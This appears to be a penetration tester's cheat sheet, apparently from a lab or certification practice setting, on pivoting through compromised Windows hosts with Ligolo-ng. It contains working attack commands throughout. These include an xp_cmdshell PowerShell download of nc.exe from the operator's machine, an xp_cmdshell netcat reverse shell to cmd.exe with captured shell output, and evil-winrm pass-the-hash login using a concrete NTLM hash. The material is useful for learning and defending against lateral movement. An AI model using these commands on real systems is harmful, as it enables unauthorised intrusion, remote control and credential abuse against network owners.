
*Tips for stability*: `sudo ip link set tun0 mtu 1000`

---
## First Pivot  

Create Interface

```
ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert
```

Run Ligolo Agent on First Compromised Machine

```
./agent -connect 10.10.10.10:11601 -ignore-cert
```

Create Tunnel on Ligolo

```
session
start --tun ligolo
```

Add Route for Ligolo Interface

```
sudo ip route add 152.20.20.0/24 dev ligolo
```

Troubleshooting

```
ip link delete ligolo
```

---
## Second Pivot

Create Interface

```
sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:11602
```

Run Ligolo Agent on Compromised Machine

```
./agent -connect 10.10.10.10:11602 -ignore-cert
```

Create Tunnel on Ligolo

```
session
start --tun ligolo-double
```

Add Route for Ligolo-Double Interface

```
sudo ip route add 172.16.2.0/24 dev ligolo-double
```

Troubleshooting

```
ip link delete ligolo-double
```

---

#### Triple Pivot

Create Interface

```
sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:11603
```

Run Ligolo Agent on Compromised Machine

```
./agent -connect 10.10.10.10:11603 -ignore-cert
```

Create Tunnel on Ligolo

```
session
start --tun ligolo-triple
```

Add Route for target endpoint (since whole subnet is redundant) for Ligolo-Triple Interface

```
sudo ip route add 172.16.2.101 dev ligolo-triple
```

Troubleshooting

```
ip link delete ligolo-triple
```




#### Go on Ligolo Session and Add Listener on First Pivot

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Confirm listeners

```
listener_list
```
#### Run Ligolo Agent on Second Pivot (152.20.20.13 / 175.162.10.12)
**Important**: Here we connect back to the first pivot that listen and redirect traffic to the ligolo proxy.

```
./agent.exe -connect 152.20.20.60:11601 -ignore-cert
```
#### Choose Session
```
>> session # Choose second session
>> 2
```
#### Add Route for ligolo-double Interface
```
sudo ip add 175.162.10.0/24 dev ligolo-double
```
#### Start Tunnel on Ligolo
```
>> start --tun ligolo-double
```

---
## File Transfers (Double Pivot)

When you somehow got command execution on MS02, you can use this methodology to file transfer files onto MS02 from local machine.

1. Start up python server.

```
python3 -m http.server 80
```

2. Add following listener in Ligolo-Ng

```
listener_add --addr <ms01_internal_ip>:80 --to <local_ip>:80
```

```
listener_add --addr 10.10.95.147:80 --to 192.168.45.186:80
```

Now MS02 can speak to MS01 under port 80 and the traffic get's redirected to our local machine on port 80, which means file transfers are possible.

3. Download Command

It's important to use the internal network ip of ms01 (dual-homed machine), because ms02 won't reach our kali ip directly.

```
EXEC xp_cmdshell  'powershell -c "iwr -uri http://10.10.133.147/nc.exe -OutFile C:\Users\Public\nc.exe"';
```
## Local File Download / Transfer SMB

1. Start up smb server on local machine.

```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```

2. Setup listener in Ligolo-Ng

We need to forward any traffic from MS01's internal network ip to our local machine ip on port 445!

```
listener_add --addr 0.0.0.0:445 --to 192.168.45.171:445
```

---
## Reverse Shell (Double Pivot)

1. Start up listener on local machine.

```
rlwrap nc -lvnp 49700
```

2. Add following listener in Ligolo-Ng

This will listen on ALL interfaces with in MS01 & forward traffic onto our local machine on port 49700.

```
listener_add --addr 0.0.0.0:49700 --to 192.168.45.186:49700
```

3. Execute command:

Execute an reverse connection to the MS01 dual homed internal ip, because MS02 can't talk to our local machine, but the traffic of ms01 get's forwarded to our local machine!

```
EXEC xp_cmdshell 'C:\Users\Public\nc.exe 10.10.133.147 49700 -e cmd.exe';
```

Gained RCE.

```
rlwrap nc -lvnp 49700
listening on [any] 49700 ...
connect to [192.168.45.171] from (UNKNOWN) [192.168.45.171] 54060
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
```

---
## Enabling WinRM or other services to connect to from local machine (Double Pivot)

1. Setup listener in Ligolo-Ng

In our case we want to connect with our retrieved credentials to MS02, which we can't reach from our local machine. Therefore we will listen on all interfaces on MS01 on port 4444 and forward all traffic to our local ip on port 5985.

```
listener_add --addr 0.0.0.0:4444 --to 10.10.95.148:5985 --tcp
```

```
listener_add --addr <ms01_internal_ip>:4444 --to <ms02_internal_ip>:5985 --tcp
```

2. Now we should be able to connect via evil-winrm in the whole subnet!

```
evil-winrm -i 10.10.133.147 -u Administrator -H '507e8b20766f720619e9f33d73756b34' -P 4444
```

```
evil-winrm -i <ms01_internal_ip> -u <user> -H <hash> -P <ms01_listener_port>
```

---
#### List Listener

```
>> listener_list
```
#### Cleanup

```
ip link set ligolo down
ip link delete ligolo
OR
interface_delete --name ligolo
# Safely deletes the ligolo TUN interface from your machine.
```